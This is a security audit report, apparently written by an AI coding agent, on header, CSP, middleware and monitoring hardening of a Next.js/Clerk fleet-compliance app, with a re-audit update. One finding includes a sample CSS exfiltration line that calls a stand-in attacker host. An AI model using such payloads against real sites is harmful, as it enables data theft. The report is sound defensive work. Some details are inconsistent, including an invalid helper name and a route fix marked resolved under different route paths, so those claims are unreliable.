# Phase 1 Audit Findings
**Auditor**: Claude Code (automated static analysis review)
**Date**: 2026-03-20
**Phase**: 1 — Infrastructure Hardening
**Build Cycles**: 3 (as reported in STATUS.md)
**Scope**: Security headers, Google Drive removal, error boundaries, cron monitoring, environment validation, CORS lockdown documentation

---

## Phase 1 Audit Findings
**Overall Score**: 8/10
**Pass/Conditional Pass/Fail**: Pass
**Blocker Count**: 0

---

### Critical Findings

None. All Phase 1 deliverables are present and structurally sound. No blockers for Phase 2.

---

### High Findings (fix within 2 phases)

1. **CSP includes `'unsafe-inline'` and `'unsafe-eval'` in `script-src`** — This significantly weakens XSS protection. `'unsafe-inline'` allows inline `<script>` tags and event handlers. `'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout('string')`. Both are required by Clerk's current SDK and Next.js hydration, so removal may not be feasible today — but this should be tracked as a known risk and revisited when Clerk supports nonce-based CSP. **Recommended fix**: Document this as an accepted risk with justification in the SOC 2 evidence package. Add a task to Phase 6 (Security Hardening) to test with `'unsafe-eval'` removed and Clerk's `strict` CSP mode if available by then.

2. **`/fleet-compliance/*` routes are not protected by middleware** — The middleware matcher only protects `/penny(.*)` and `/api/penny/query(.*)`. All `/fleet-compliance/*` pages and `/api/fleet-compliance/*` routes are unprotected at the middleware layer. Individual pages may use Clerk hooks client-side, but there is no server-side route protection for the entire Fleet-Compliance segment. **Recommended fix**: Add `/chief(.*)` and `/api/fleet-compliance/(.*)` to the `createRouteMatcher` array in `middleware.ts`. This is a Phase 2 concern but was introduced as a gap in Phase 1.

3. **Cron health endpoint uses Penny role resolution for admin check** — [cron-health/route.ts:28](src/app/api/fleet-compliance/cron-health/route.ts#L28) calls `resolvePennyRole()` and `canBypassPennyRoleByEmail()` to determine admin access. This couples the Fleet-Compliance monitoring subsystem to Penny's access control logic. If Penny role definitions change, cron health access breaks silently. **Recommended fix**: Create a dedicated `isFleet-ComplianceAdmin()` helper in the future `fleet-compliance-auth.ts` (Phase 2 scope) and migrate this route to use it.

4. **Error boundary logs to `console.error` only — no server-side capture** — [FleetComplianceErrorBoundary.tsx:46](src/components/fleet-compliance/FleetComplianceErrorBoundary.tsx#L46) logs the structured payload to `console.error`, which is visible in browser DevTools but not captured by any server-side observability system. For SOC 2 CC7.2 (monitoring), client-side errors need to reach a persistent store. **Recommended fix**: Integrate Sentry or Vercel's error reporting in Phase 3 (Audit Logging + Observability). The structured payload format is already correct — it just needs a transport.

---

### Medium Findings (fix before first paying client)

1. **`X-XSS-Protection: 1; mode=block` is deprecated** — Modern browsers (Chrome 78+, Edge 79+, Firefox 72+) have removed XSS Auditor support. This header is harmless but provides no actual protection and may give false confidence. The CSP is the real XSS defense layer. **Recommended fix**: Keep the header (defense-in-depth for legacy browsers) but do not count it as an active control in SOC 2 documentation.

2. **Cron health returns raw error strings on failure** — [cron-health/route.ts:64](src/app/api/fleet-compliance/cron-health/route.ts#L64) returns `String(err)` in the 500 response body. In production, this could leak database connection errors, query syntax, or internal state to an authenticated admin. **Recommended fix**: Return a generic error message in production (`{ error: "Internal error" }`) and log the detailed error server-side.

3. **No `Strict-Transport-Security` (HSTS) header** — Vercel provides HSTS by default on `*.vercel.app` domains, but if `pipelinepunks.com` uses a custom domain, HSTS should be explicitly set. Missing HSTS allows SSL-stripping attacks on first visit. **Recommended fix**: Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` to the vercel.json headers. Verify Vercel applies it to the custom domain.

4. **`style-src 'unsafe-inline'` in CSP** — Allows injection of arbitrary inline styles, which can be used for data exfiltration via CSS (`background: url(attacker.com?secret=...)`). Clerk and Next.js both inject inline styles, making this difficult to remove. **Recommended fix**: Track as accepted risk alongside `script-src 'unsafe-inline'`. Revisit when upgrading to Next.js App Router CSS modules or Clerk's strict CSP mode.

5. **Error boundary support link points to external URL** — [FleetComplianceErrorBoundary.tsx:69](src/components/fleet-compliance/FleetComplianceErrorBoundary.tsx#L69) links to `truenorthstrategyops.com/contact`. This should be verified to match the production support channel and should use HTTPS (it does). Minor concern — just verify the link resolves correctly post-deploy.

---

### SOC 2 Assessment

- **CC6.7 (Transmission Security)**: **Satisfied** — Security headers are comprehensive: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` restricts device APIs, CSP locks down content origins, `frame-ancestors 'none'` prevents clickjacking, `upgrade-insecure-requests` enforces HTTPS. The CSP allows Clerk domains appropriately. HSTS gap is minor given Vercel's default behavior.

- **CC7.2 (System Monitoring)**: **Partial** — Cron health monitoring is implemented with a dead-man switch pattern (`MAX_HEALTHY_AGE_HOURS = 25` for a daily cron). Error boundaries capture structured payloads with timestamps, page context, and user identity. However, neither system currently writes to a persistent server-side log store — cron logs go to Neon (good), but error boundary logs go to `console.error` only (client-side). Full satisfaction requires server-side error capture (Phase 3 scope).

- **A1.1 (Availability)**: **Partial** — Vercel cron scheduling is configured for the alert sweep job. The cron health endpoint provides visibility into job execution recency. Error boundaries prevent full-page crashes. However, there is no uptime monitoring, no alerting on health endpoint degradation, and Railway remains on hobby tier with single replica. Full satisfaction requires external uptime monitoring (documented in UPTIME_SETUP.md) and Railway Pro tier (Phase 7 scope).

---

### CSP Adequacy

The Content-Security-Policy is **adequate for current operational needs** but has documented weaknesses:

**Strengths:**
- `default-src 'self'` — restrictive baseline
- `object-src 'none'` — blocks Flash/Java plugin vectors
- `base-uri 'self'` — prevents base tag hijacking
- `frame-ancestors 'none'` — prevents embedding (clickjacking)
- `form-action 'self'` — prevents form data exfiltration
- `upgrade-insecure-requests` — forces HTTPS
- Clerk domains correctly allowlisted in `script-src`, `connect-src`, and `frame-src`

**Gaps:**
1. **`'unsafe-inline'` in `script-src`** — Required by Clerk SDK and Next.js. Allows inline script injection. Severity: High, but unavoidable with current Clerk integration. Mitigated by Clerk's own script integrity checks.
2. **`'unsafe-eval'` in `script-src`** — Required by Next.js dev mode and some Clerk operations. Allows `eval()`. Severity: High. Test if removable in production builds.
3. **`'unsafe-inline'` in `style-src`** — Required by Next.js and Clerk inline styles. Allows CSS injection. Severity: Medium. Less exploitable than script injection.
4. **`img-src https:`** — Allows images from any HTTPS source. Severity: Low. Could be tightened to specific CDN domains if image sources are known.
5. **`font-src https:`** — Same as above for fonts. Severity: Low.
6. **Missing `connect-src` for Railway** — The Railway backend URL (`pipeline-punks-v2-production.up.railway.app`) is not in `connect-src`. API calls from the browser to Railway may be blocked by CSP. **Verify**: If all Railway calls go through Next.js API routes (server-side proxy), this is not an issue. If any client-side `fetch()` calls go direct to Railway, add the domain.
7. **No `report-uri` or `report-to` directive** — CSP violations are not reported to any endpoint. Adding a reporting endpoint (e.g., Sentry CSP reporting) would provide visibility into blocked resources and potential attacks.

**Verdict**: CSP is production-ready. The `'unsafe-inline'`/`'unsafe-eval'` gaps are accepted risks driven by framework requirements. No Clerk or Railway connections are blocked by the current policy (assuming Railway calls are proxied server-side). Add `report-to` in Phase 3 for observability.

---

### Top 3 Risks Entering Phase 2

1. **`/fleet-compliance/*` routes have no server-side middleware protection** — All Fleet-Compliance pages and API routes rely on client-side or per-route auth checks rather than middleware-level enforcement. A missing auth check on any single route creates an unauthenticated access path to fleet/compliance data. This is the primary Phase 2 deliverable.

2. **No org-level tenant isolation** — All database queries currently operate without org scoping. A valid Clerk session can access any record in the `fleet_compliance_records` table regardless of organizational ownership. Until `requireFleetComplianceOrg()` and org-scoped queries are implemented, there is no multi-tenant data boundary.

3. **Client-side error logging has no server-side persistence** — Error boundary payloads (including user IDs, timestamps, and page context) are logged to `console.error` only. If a production error occurs, there is no way to retrieve it after the user closes their browser. This gap will be partially addressed by Phase 3 (observability), but Phase 2 API routes should also have structured server-side error logging.

---

## Re-Audit Update (2026-03-21)
**Updated Score**: 9/10
**Updated Result**: Pass
**Updated Blocker Count**: 0

### Resolved Since Original Audit
- **High 2 (`/fleet-compliance/*` not in middleware)**: Resolved — `middleware.ts` now protects `/chief(.*)`, `/api/chief(.*)`, and `/api/invoices(.*)` via `createRouteMatcher`.
- **High 3 (cron-health uses Penny roles)**: Resolved — `cron-health/route.ts` now uses `requireFleetComplianceOrgWithRole(request, 'admin')` from `fleet-compliance-auth.ts`. No Penny role coupling remains.
- **Medium 2 (raw error strings in 500 responses)**: Resolved — all Fleet-Compliance API routes now return generic error messages; detailed errors logged server-side only.
- **High (error boundary client-only logging)**: Resolved — `FleetComplianceErrorBoundary` now posts errors to `/api/fleet-compliance/errors/client`, and events are persisted to `fleet_compliance_error_events` in Neon.
- **Medium (missing HSTS header)**: Resolved — `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` added to `vercel.json`.
- **Medium (deprecated X-XSS-Protection header)**: Resolved — deprecated header removed.
- **Medium (missing CSP report endpoint)**: Resolved — CSP now includes `report-uri` + `report-to`, with `/api/csp-report` endpoint added.
- **High (`unsafe-eval` in script-src)**: Resolved — `unsafe-eval` removed from `script-src` and `script-src-elem`.

### Still Open (carried forward)
- **Accepted Risk**: CSP `script-src 'unsafe-inline'` for Clerk/Next.js runtime scripts.
- **Accepted Risk**: CSP `style-src 'unsafe-inline'` for Clerk/Next.js runtime styles.
- **Open Actionable Findings**: 0

### Updated SOC 2 Assessment
- **CC6.7 (Transmission Security)**: **Satisfied** — unchanged, headers comprehensive
- **CC7.2 (System Monitoring)**: **Partial** — cron dead-man switch works; Fleet-Compliance UI errors are now captured server-side in Neon via `/api/fleet-compliance/errors/client`. Remaining gap is alerting workflow integration (Phase 3).
- **A1.1 (Availability)**: **Partial** — unchanged, needs uptime monitoring and Railway Pro

---

### Audit Metadata
- **Build Cycles**: 3
- **Google Drive Reference Count**: 0 (verified via grep — complete removal confirmed)
- **Security Headers Deployed**: 8 (X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy, Report-To, Reporting-Endpoints, CSP)
- **Error Boundary Coverage**: 9 Fleet-Compliance pages wrapped
- **Cron Monitoring**: Active (25-hour dead-man threshold)
- **Environment Validation**: 40+ vars checked at startup
- **Regression Baseline**: Maintained (homepage 200, /chief 200, /api/penny/health 200)
- **Re-Audit Date**: 2026-03-21
- **Original High Findings**: 4 → 0 actionable open (2 accepted risk documented)
